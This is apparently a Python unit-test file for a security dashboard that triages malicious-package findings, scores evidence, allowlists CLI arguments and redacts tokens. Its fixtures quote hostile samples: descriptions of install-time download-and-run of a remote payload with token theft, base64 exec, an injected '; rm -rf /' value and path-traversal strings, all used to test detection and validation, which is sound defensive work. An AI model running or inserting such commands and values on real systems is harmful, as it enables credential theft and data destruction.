#!/usr/bin/env python3
import inspect
import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock
import sys

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import dashboard_server as server


class TriageOpsEvidenceTests(unittest.TestCase):
    def finding(self, package='mistralai', version='2.4.6', analysis='Deterministic rules flagged: credential-access, network-egress'):
        return {
            'finding_id': 'SCM-0F5D5BD1A07E9184',
            'ecosystem': 'pypi',
            'package': package,
            'new_version': version,
            'analysis': analysis,
            'report_path': '/Users/chrixchange/secopsai/data/supply_chain/reports/sample.md',
        }

    def test_advisory_backed_mistralai_is_likely_true_positive_without_local_usage(self):
        payload = server.build_evidence_verdict_payload(
            self.finding(),
            advisory={'matched': True, 'matches': [{'source_urls': ['https://example.test/advisory']}]},
            local_usage={'present': False, 'matches': [], 'searched_files': 3},
            report={
                'ok': True,
                'path': '/Users/chrixchange/secopsai/data/supply_chain/reports/sample.md',
                'text': 'Import-time execution downloads https://git-tanstack.com/transformers.pyz to /tmp/transformers.pyz and runs python3 /tmp/transformers.pyz while reading token environment variables.',
            },
            explanation={'matched_rules': ['credential-access', 'network-egress']},
        )
        self.assertIn(payload['package_verdict'], {'confirmed_true_positive', 'likely_true_positive'})
        self.assertEqual(payload['environment_impact'], 'not_observed')
        self.assertEqual(payload['recommended_disposition'], 'needs_review')
        self.assertGreaterEqual(payload['score'], 65)
        self.assertTrue(payload['references'])

    def test_absence_of_local_usage_does_not_override_package_verdict(self):
        payload = server.build_evidence_verdict_payload(
            self.finding(),
            advisory={'matched': True, 'matches': []},
            local_usage={'present': False, 'matches': []},
            report={'ok': True, 'text': 'setup.py contains a curl https://83.142.209.194/transformers.pyz call'},
            explanation={},
        )
        self.assertNotIn(payload['package_verdict'], {'false_positive', 'likely_false_positive'})
        self.assertEqual(payload['environment_impact'], 'not_observed')

    def test_weak_litellm_example_trends_false_positive(self):
        payload = server.build_evidence_verdict_payload(
            self.finding(package='litellm', version='1.85.0rc2', analysis='Deterministic rules flagged: generic metadata heuristic'),
            advisory={'matched': False, 'matches': []},
            local_usage={'present': False, 'matches': [], 'searched_files': 3},
            report={'ok': True, 'text': 'Report mostly contains generated asset and normal framework API client code.'},
            explanation={'matched_rules': ['generic metadata heuristic']},
        )
        self.assertIn(payload['package_verdict'], {'likely_false_positive', 'false_positive', 'needs_review'})
        self.assertLessEqual(payload['score'], 35)
        self.assertEqual(payload['environment_impact'], 'not_observed')

    def test_raw_report_strong_indicators_raise_score(self):
        evidence = server.parse_report_evidence(
            'setup.py writes /tmp/payload, calls curl https://example.test/a.py, reads GITHUB_TOKEN, then exec(base64.b64decode(blob))',
            ['example.test'],
        )
        self.assertTrue(evidence['signals']['install_time_execution'])
        self.assertTrue(evidence['signals']['outbound_network'])
        self.assertTrue(evidence['signals']['credential_access'])
        self.assertTrue(evidence['signals']['obfuscation'])
        self.assertTrue(evidence['signals']['suspicious_file_writes'])
        self.assertTrue(evidence['signals']['known_ioc_matches'])

    def test_campaign_payload_accepts_cross_ecosystem_packages(self):
        payload = server.validate_campaign_payload(
            {
                'campaign_id': 'cross-ecosystem-test',
                'source_urls': ['https://example.test/report'],
                'packages': [
                    {'ecosystem': 'npm', 'package': '@scope/pkg', 'version': '1.2.3'},
                    {'ecosystem': 'maven', 'package': 'com.example:artifact', 'version': '1.2.3'},
                    {'ecosystem': 'huggingface', 'package': 'org/model', 'version': 'main'},
                ],
            }
        )
        self.assertEqual(len(payload['packages']), 3)
        self.assertEqual(payload['packages'][1]['package'], 'com.example:artifact')

    def test_campaign_payload_rejects_unsupported_ecosystem(self):
        with self.assertRaises(ValueError):
            server.validate_campaign_payload(
                {
                    'campaign_id': 'bad',
                    'packages': [{'ecosystem': 'apt', 'package': 'curl', 'version': '1.0'}],
                }
            )

    def test_campaign_research_args_are_allowlisted(self):
        args = server.build_campaign_research_args('/tmp/campaign.json', persist=True, search_root='/Users/chrixchange/secopsai')
        self.assertEqual(args[:3], ['supply-chain', 'research-campaign', '--input'])
        self.assertIn('--persist', args)
        self.assertIn('--search-root', args)
        self.assertNotIn(';', ' '.join(args))

    def test_campaign_discovery_args_are_allowlisted(self):
        args = server.build_campaign_discover_args({'since': '24h', 'source': 'Socket', 'limit': 12})
        self.assertEqual(args[:3], ['supply-chain', 'discover-campaigns', '--since'])
        self.assertIn('Socket', args)
        self.assertNotIn(';', ' '.join(args))

    def test_campaign_autopilot_args_protect_persist_mode(self):
        args, needs_admin = server.build_campaign_autopilot_args({'since': '24h', 'limit': 5, 'persist': True, 'create_drafts': True})
        self.assertTrue(needs_admin)
        self.assertIn('--persist', args)
        self.assertIn('--create-drafts', args)
        self.assertNotIn(';', ' '.join(args))

    def test_campaign_actions_are_not_finding_actions(self):
        self.assertIn('campaign-autopilot', server.CAMPAIGN_TRIAGE_OPS_ACTIONS)
        self.assertIn('campaign-discover', server.CAMPAIGN_TRIAGE_OPS_ACTIONS)
        self.assertIn('campaign-orchestrate', server.CAMPAIGN_TRIAGE_OPS_ACTIONS)
        self.assertIn('research-campaign', server.CAMPAIGN_TRIAGE_OPS_ACTIONS)

    def test_campaign_watchlist_args_validate_source_url(self):
        args = server.build_campaign_watchlist_args({'package': 'npm:chalk-tempalte'})
        self.assertEqual(args[:3], ['supply-chain', 'campaign-watchlist', 'add'])
        self.assertIn('--package', args)
        with self.assertRaises(ValueError):
            server.build_campaign_watchlist_args({'source_url': 'javascript:alert(1)'})

    def test_campaign_fixture_loads_without_temp_paths(self):
        fixtures = server.campaign_fixture_payloads()
        self.assertTrue(fixtures)
        self.assertEqual(fixtures[0]['campaign']['campaign_id'], 'deadcode09284814-infostealer-botnet-campaign')
        self.assertNotIn('/tmp/secopsai-campaign', str(fixtures[0]))
        self.assertNotIn('/Users/chrixchange', str(fixtures[0]))

    def test_compact_cli_result_redacts_secret_like_values(self):
        compact = server.compact_cli_result(
            {'ok': True, 'returncode': 0, 'stdout': 'GITHUB_TOKEN=ghp_this_should_hide', 'stderr': ''}
        )
        self.assertNotIn('ghp_this_should_hide', compact['stdout'])
        self.assertIn('[redacted]', compact['stdout'])

    def test_local_blog_ops_action_args_are_allowlisted(self):
        args = server.build_blog_ops_action_args('publish-approved', {'limit': 5})
        self.assertEqual(args, ['blog', 'news-publish-approved', '--rebuild'])
        args = server.build_blog_ops_action_args('approve', {'note': 'Reviewed source-backed draft'}, draft='news-example')
        self.assertEqual(args[:3], ['blog', 'news-review', 'approve'])
        self.assertIn('news-example', args)
        self.assertNotIn(';', ' '.join(args))

    def test_local_blog_ops_attach_source_media_args_are_allowlisted(self):
        args = server.build_blog_ops_action_args(
            'attach-source-media',
            {
                'media_url': 'https://cdn.example/image.png',
                'media_index': 2,
                'alt': 'Source screenshot',
                'source_name': 'Example News',
                'source_url': 'https://example.com/story',
            },
            draft='news-example',
        )
        self.assertEqual(args[:3], ['blog', 'attach-source-media', 'news-example'])
        self.assertIn('--url', args)
        self.assertIn('https://cdn.example/image.png', args)
        self.assertIn('--media-index', args)
        self.assertIn('2', args)
        self.assertNotIn(';', ' '.join(args))
        with self.assertRaises(ValueError):
            server.build_blog_ops_action_args('attach-source-media', {'media_url': 'file:///tmp/image.png'}, draft='news-example')
        for unsafe_draft in ('../secret', '/tmp/news-example', 'nested/news-example', 'news..example'):
            with self.subTest(unsafe_draft=unsafe_draft):
                with self.assertRaises(ValueError):
                    server.build_blog_ops_action_args(
                        'attach-source-media',
                        {'media_url': 'https://cdn.example/image.png'},
                        draft=unsafe_draft,
                    )

    def test_local_blog_ops_review_draft_ids_are_slug_only(self):
        for action in ('approve', 'reject', 'needs-review', 'save'):
            with self.subTest(action=action):
                with self.assertRaises(ValueError):
                    server.build_blog_ops_action_args(action, {'note': 'reviewed'}, draft='../secret')
                with self.assertRaises(ValueError):
                    server.build_blog_ops_action_args(action, {'note': 'reviewed'}, draft='/tmp/news-example')

    def test_local_blog_ops_global_action_buttons_map_to_expected_cli(self):
        expected = {
            'news-fetch': ['blog', 'news-fetch', '--limit', '7'],
            'news-draft': ['blog', 'news-draft', '--limit', '7'],
            'news-run': ['blog', 'news-run', '--limit', '7'],
            'publish-approved': ['blog', 'news-publish-approved', '--rebuild'],
            'rebuild-feeds': ['blog', 'rebuild-feeds'],
        }
        for action, cli in expected.items():
            with self.subTest(action=action):
                self.assertEqual(server.build_blog_ops_action_args(action, {'limit': 7}), cli)
        with self.assertRaises(ValueError):
            server.build_blog_ops_action_args('deploy', {'limit': 7})

    def test_local_blog_ops_deploy_availability_uses_allowlisted_tools(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / 'blog').mkdir()
            with mock.patch.object(server, 'SECOPSAI_ROOT', root), mock.patch.object(server.shutil, 'which') as which:
                which.side_effect = lambda name: f'/usr/bin/{name}' if name == 'wrangler' else None
                self.assertTrue(server.local_blog_deploy_available())

    def test_local_blog_ops_deploy_is_separate_allowlist(self):
        with self.assertRaises(ValueError):
            server.build_blog_ops_action_args('deploy', {'limit': 5})

    def test_local_blog_ops_deploy_marks_staged_drafts_deployed_after_wrangler(self):
        source = inspect.getsource(server.DashboardHandler.do_POST)
        deploy_index = source.index("run_local_blog_deploy")
        mark_index = source.index("news-mark-deployed")
        self.assertGreater(mark_index, deploy_index)
        self.assertIn("'deployed_state'", source)
        self.assertIn("Cloudflare Pages deploy completed, but Blog Ops could not mark staged drafts as deployed.", source)
        self.assertIn("Cloudflare Pages deploy failed.", source)

    def test_local_blog_ops_deploy_command_is_allowlisted(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / 'blog').mkdir()
            with mock.patch.object(server, 'SECOPSAI_ROOT', root), mock.patch.object(server.shutil, 'which') as which:
                which.side_effect = lambda name: f'/usr/bin/{name}' if name == 'wrangler' else None
                command = server.local_blog_deploy_command()
        self.assertEqual(command[:4], ['/usr/bin/wrangler', 'pages', 'deploy', str((root / 'blog').resolve())])
        self.assertIn('--project-name', command)
        self.assertIn('secopsai-blog', command)
        self.assertIn('--branch', command)
        self.assertIn('main', command)
        self.assertNotIn(';', ' '.join(command))

    def test_latest_first_sort_handles_common_dashboard_dates(self):
        rows = [
            {'id': 'old', 'created_at': '2026-05-20T10:00:00Z'},
            {'id': 'new', 'updated_at': '2026-06-01T08:00:00Z'},
            {'id': 'middle', 'detected_at': '31/05/2026, 18:30:00'},
            {'id': 'undated'},
        ]
        ordered = server.sort_latest_first(rows)
        self.assertEqual([item['id'] for item in ordered], ['new', 'middle', 'old', 'undated'])

    def test_blog_review_drafts_payload_sorts_newest_source_first(self):
        with mock.patch.object(server, 'run_cli_json') as run_cli_json:
            run_cli_json.side_effect = [
                (
                    {'ok': True, 'returncode': 0, 'stdout': '{}', 'stderr': ''},
                    {
                        'drafts': [
                            {'slug': 'old', 'review_status': 'needs_review', 'source_metadata': {'published_at': '2026-05-20T10:00:00Z'}},
                            {'slug': 'new', 'review_status': 'needs_review', 'source_metadata': {'published_at': '2026-06-01T09:00:00Z'}},
                            {'slug': 'fallback', 'review_status': 'approved', 'updated_at': '2026-05-31T23:00:00Z'},
                        ]
                    },
                ),
                ({'ok': True, 'returncode': 0, 'stdout': '{}', 'stderr': ''}, {'sources': []}),
            ]
            result, payload = server._blog_review_drafts_payload()

        self.assertTrue(result['ok'])
        self.assertEqual([draft['slug'] for draft in payload['drafts']], ['new', 'fallback', 'old'])
        self.assertEqual(payload['counts']['drafts'], 3)

    def test_blog_review_counts_publishable_and_blocked_approved_drafts(self):
        with mock.patch.object(server, 'run_cli_json') as run_cli_json:
            run_cli_json.side_effect = [
                (
                    {'ok': True, 'returncode': 0, 'stdout': '{}', 'stderr': ''},
                    {
                        'drafts': [
                            {'slug': 'ready', 'review_status': 'approved', 'readiness_status': 'ready', 'readiness_blockers': []},
                            {'slug': 'blocked', 'review_status': 'approved', 'readiness_status': 'blocked', 'readiness_blockers': ['missing mitigation']},
                            {'slug': 'review', 'review_status': 'needs_review', 'readiness_status': 'ready'},
                        ]
                    },
                ),
                ({'ok': True, 'returncode': 0, 'stdout': '{}', 'stderr': ''}, {'sources': []}),
            ]
            _, payload = server._blog_review_drafts_payload()

        self.assertEqual(payload['counts']['approved'], 2)
        self.assertEqual(payload['counts']['approved_publishable'], 1)
        self.assertEqual(payload['counts']['approved_blocked'], 1)

    def test_triage_ops_no_local_usage_is_no_local_impact_not_actionable(self):
        with mock.patch.object(server, 'check_local_dependency_usage', return_value={'present': False, 'matches': []}):
            alert = server.summarize_triage_ops_alert({
                'finding_id': 'SCM-UNIT',
                'ecosystem': 'pypi',
                'package': 'scikit-learn',
                'new_version': '1.9.0',
                'severity': 'critical',
                'status': 'open',
                'analysis': 'Deterministic rules flagged: network egress',
            })

        self.assertEqual(alert['recommendation']['recommended_disposition'], 'not_applicable')
        self.assertEqual(alert['actionability']['bucket'], 'no_local_impact')
        self.assertFalse(alert['actionability']['is_actionable'])
        self.assertEqual(alert['display_severity'], 'info')

    def test_triage_ops_advisory_match_stays_actionable(self):
        with mock.patch.object(server, 'check_local_dependency_usage', return_value={'present': False, 'matches': []}):
            alert = server.summarize_triage_ops_alert({
                'finding_id': 'SCM-UNIT',
                'ecosystem': 'npm',
                'package': '@scope/pkg',
                'new_version': '1.2.3',
                'severity': 'critical',
                'status': 'open',
                'analysis': 'Deterministic rules flagged: credential access',
                'advisory_ids': ['GHSA-unit'],
            })

        self.assertEqual(alert['actionability']['bucket'], 'actionable')
        self.assertTrue(alert['actionability']['is_actionable'])
        self.assertEqual(alert['display_severity'], 'critical')

    def test_publish_approved_blocked_error_includes_readiness_reasons(self):
        error, hint = server.publish_approved_blocked_error({
            'blocked': [
                {
                    'slug': 'blocked-draft',
                    'title': 'Blocked draft',
                    'reasons': ['missing IOC', 'missing SecOpsAI angle'],
                }
            ]
        })
        self.assertIn('Publish approved blocked by 1 draft readiness check', error)
        self.assertIn('Blocked draft', error)
        self.assertIn('missing IOC', error)
        self.assertIn('resolve the readiness blockers', hint)

    def test_dependency_usage_reuses_manifest_text_cache(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            manifest = root / 'package.json'
            manifest.write_text('{"dependencies":{"demo-package":"1.2.3"}}', encoding='utf-8')
            server._DEPENDENCY_TEXT_CACHE.clear()
            with mock.patch.object(server, 'dependency_manifest_paths', return_value=[manifest]):
                first = server.check_local_dependency_usage('demo-package', '1.2.3')
            with mock.patch.object(server, 'dependency_manifest_paths', return_value=[manifest]), \
                 mock.patch.object(Path, 'read_text', side_effect=AssertionError('cache miss')):
                second = server.check_local_dependency_usage('demo-package', '1.2.3')

            self.assertTrue(first['present'])
            self.assertTrue(second['present'])

    def test_edge_workspace_uses_core_as_canonical_source(self):
        cli_results = [
            ({'ok': True}, {'assets': [{'node_id': 'edge:asset:1', 'ip_address': '192.168.1.10'}]}),
            ({'ok': True}, {'nodes': [{'id': 'edge:asset:1'}], 'edges': []}),
            ({'ok': True}, {'findings': [{'finding_id': 'EDGE-ABC123', 'source': 'secopsai_edge'}]}),
        ]
        with mock.patch.object(server, 'run_cli_json', side_effect=cli_results) as run_cli, \
             mock.patch.object(server, 'edge_api_snapshot', return_value={'configured': False, 'ok': False}):
            payload = server.collect_edge_workspace()

        self.assertTrue(payload['ok'])
        self.assertEqual(payload['core']['assets'][0]['ip_address'], '192.168.1.10')
        self.assertEqual(payload['core']['findings'][0]['finding_id'], 'EDGE-ABC123')
        self.assertEqual(run_cli.call_args_list[0].args[0][:4], ['graph', 'assets', '--limit', '500'])
        self.assertIn('secopsai_edge', run_cli.call_args_list[2].args[0])

    def test_edge_api_snapshot_never_returns_admin_token_on_failure(self):
        with mock.patch.dict(
            os.environ,
            {'SECOPSAI_EDGE_API_URL': 'https://edge.example.test', 'SECOPSAI_EDGE_ADMIN_TOKEN': 'top-secret-token'},
            clear=False,
        ), mock.patch.object(server.urllib.request, 'urlopen', side_effect=RuntimeError('token=top-secret-token')):
            payload = server.edge_api_snapshot()

        self.assertFalse(payload['ok'])
        self.assertNotIn('top-secret-token', json.dumps(payload))

    def test_edge_api_snapshot_prefers_scoped_operations_token(self):
        def response_for(request, timeout=0):
            response = mock.MagicMock()
            if request.full_url.endswith('/api/v1/integration-tokens/self'):
                response.read.return_value = json.dumps({
                    'id': 'token-operations',
                    'state': 'active',
                    'expires_at': '2026-10-11T00:00:00Z',
                    'expires_in_days': 90,
                    'rotation_recommended': False,
                }).encode()
            else:
                response.read.return_value = b'[]'
            response.__enter__.return_value = response
            return response
        with mock.patch.dict(
            os.environ,
            {
                'SECOPSAI_EDGE_API_URL': 'https://edge.example.test',
                'SECOPSAI_EDGE_OPERATIONS_TOKEN': 'scoped-operations-token',
                'SECOPSAI_EDGE_ADMIN_TOKEN': 'legacy-admin-token',
            },
            clear=False,
        ), mock.patch.object(server.urllib.request, 'urlopen', side_effect=response_for) as urlopen:
            payload = server.edge_api_snapshot()

        self.assertTrue(payload['ok'])
        self.assertEqual(payload['credential_scope'], 'operations:read')
        self.assertEqual(payload['credential']['expires_in_days'], 90)
        self.assertNotIn('warning', payload)
        self.assertEqual(len(urlopen.call_args_list), 5)
        for call in urlopen.call_args_list:
            request = call.args[0]
            self.assertEqual(request.get_header('Authorization'), 'Bearer scoped-operations-token')

    def test_edge_api_snapshot_warns_before_scoped_token_expires(self):
        def response_for(request, timeout=0):
            response = mock.MagicMock()
            if request.full_url.endswith('/api/v1/integration-tokens/self'):
                response.read.return_value = json.dumps({
                    'id': 'token-expiring',
                    'state': 'active',
                    'expires_at': '2026-07-20T00:00:00Z',
                    'expires_in_days': 7,
                    'rotation_recommended': True,
                }).encode()
            else:
                response.read.return_value = b'[]'
            response.__enter__.return_value = response
            return response

        with mock.patch.dict(
            os.environ,
            {
                'SECOPSAI_EDGE_API_URL': 'https://edge.example.test',
                'SECOPSAI_EDGE_OPERATIONS_TOKEN': 'scoped-operations-token',
            },
            clear=False,
        ), mock.patch.object(server.urllib.request, 'urlopen', side_effect=response_for):
            payload = server.edge_api_snapshot()

        self.assertTrue(payload['ok'])
        self.assertIn('expires in 7 day(s)', payload['warning'])
        self.assertNotIn('scoped-operations-token', json.dumps(payload))

    def test_edge_api_snapshot_keeps_operations_live_when_self_status_is_unavailable(self):
        def response_for(request, timeout=0):
            if request.full_url.endswith('/api/v1/integration-tokens/self'):
                raise server.urllib.error.URLError('self status unavailable')
            response = mock.MagicMock()
            response.read.return_value = b'[]'
            response.__enter__.return_value = response
            return response

        with mock.patch.dict(
            os.environ,
            {
                'SECOPSAI_EDGE_API_URL': 'https://edge.example.test',
                'SECOPSAI_EDGE_OPERATIONS_TOKEN': 'scoped-operations-token',
            },
            clear=False,
        ), mock.patch.object(server.urllib.request, 'urlopen', side_effect=response_for):
            payload = server.edge_api_snapshot()

        self.assertTrue(payload['ok'])
        self.assertIn('expiry could not be verified', payload['warning'])

    def test_edge_api_snapshot_marks_legacy_admin_fallback(self):
        response = mock.MagicMock()
        response.read.return_value = b'[]'
        response.__enter__.return_value = response
        with mock.patch.dict(
            os.environ,
            {
                'SECOPSAI_EDGE_API_URL': 'https://edge.example.test',
                'SECOPSAI_EDGE_OPERATIONS_TOKEN': '',
                'SECOPSAI_EDGE_ADMIN_TOKEN': 'legacy-admin-token',
            },
            clear=False,
        ), mock.patch.object(server.urllib.request, 'urlopen', return_value=response):
            payload = server.edge_api_snapshot()

        self.assertTrue(payload['ok'])
        self.assertEqual(payload['credential_scope'], 'legacy-admin')
        self.assertIn('operations:read', payload['warning'])
        self.assertNotIn('legacy-admin-token', json.dumps(payload))

    def test_json_response_ignores_disconnected_client(self):
        handler = mock.Mock()
        handler.wfile.write.side_effect = BrokenPipeError()

        server.json_response(handler, 200, {'ok': True})

        handler.send_response.assert_called_once_with(200)

    def test_research_case_command_builder_uses_allowlisted_arguments(self):
        args = server.build_research_case_args(
            'add-evidence',
            {
                'case_id': 'RSC-ABCDEF123456',
                'evidence_type': 'source',
                'title': 'Registry evidence',
                'locator': 'https://example.test/package; rm -rf /',
                'actor': 'dashboard-operator',
            },
        )

        self.assertEqual(args[:4], ['research', 'case', 'add-evidence', 'RSC-ABCDEF123456'])
        self.assertIn('https://example.test/package; rm -rf /', args)
        self.assertNotIn('sh', args)

    def test_research_case_command_builder_rejects_invalid_case_id(self):
        with self.assertRaisesRegex(ValueError, 'Invalid research case id'):
            server.build_research_case_args('export', {'case_id': '../../etc/passwd'})

    def test_research_case_retraction_requires_reason(self):
        with self.assertRaisesRegex(ValueError, 'reason is required'):
            server.build_research_case_args(
                'retract',
                {'case_id': 'RSC-ABCDEF123456', 'item_type': 'ioc', 'item_id': 'IOC-ABCDEF1234567890'},
            )

    def test_research_case_rule_builder_preserves_multiline_content(self):
        content = "title: Suspicious package\nlogsource:\n  product: app\ndetection:\n  selection:\n    EventID: 1\n  condition: selection"
        args = server.build_research_case_args(
            'add-rule',
            {
                'case_id': 'RSC-ABCDEF123456',
                'rule_type': 'sigma',
                'name': 'suspicious-package',
                'purpose': 'Detect package execution.',
                'content': content,
                'actor': 'dashboard-operator',
            },
        )

        self.assertEqual(args[:4], ['research', 'case', 'add-rule', 'RSC-ABCDEF123456'])
        self.assertIn('--content', args)
        self.assertEqual(args[args.index('--content') + 1], content)
        self.assertNotIn('  product: app detection:', args)

    def test_research_case_rule_builder_requires_content(self):
        with self.assertRaisesRegex(ValueError, 'content is required'):
            server.build_research_case_args(
                'add-rule',
                {
                    'case_id': 'RSC-ABCDEF123456',
                    'rule_type': 'sigma',
                    'name': 'missing-content',
                },
            )


if __name__ == '__main__':
    unittest.main()
